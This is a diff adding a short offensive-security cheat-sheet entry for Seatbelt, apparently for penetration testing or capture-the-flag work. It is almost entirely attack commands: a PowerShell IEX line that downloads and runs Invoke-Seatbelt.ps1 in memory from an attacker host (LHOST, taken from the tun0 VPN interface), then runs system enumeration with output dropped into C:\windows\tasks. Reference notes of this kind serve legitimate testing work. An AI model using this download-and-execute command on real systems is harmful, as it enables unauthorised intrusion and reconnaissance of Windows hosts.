@@ -1,0 +1,7 @@
+% seatbelt
+
+# standard seatbelt command via powershell
+IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/Invoke-Seatbelt.ps1")
+Invoke-Seatbelt -Command "group=system -outputfile=C:\windows\tasks\test.txt"
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
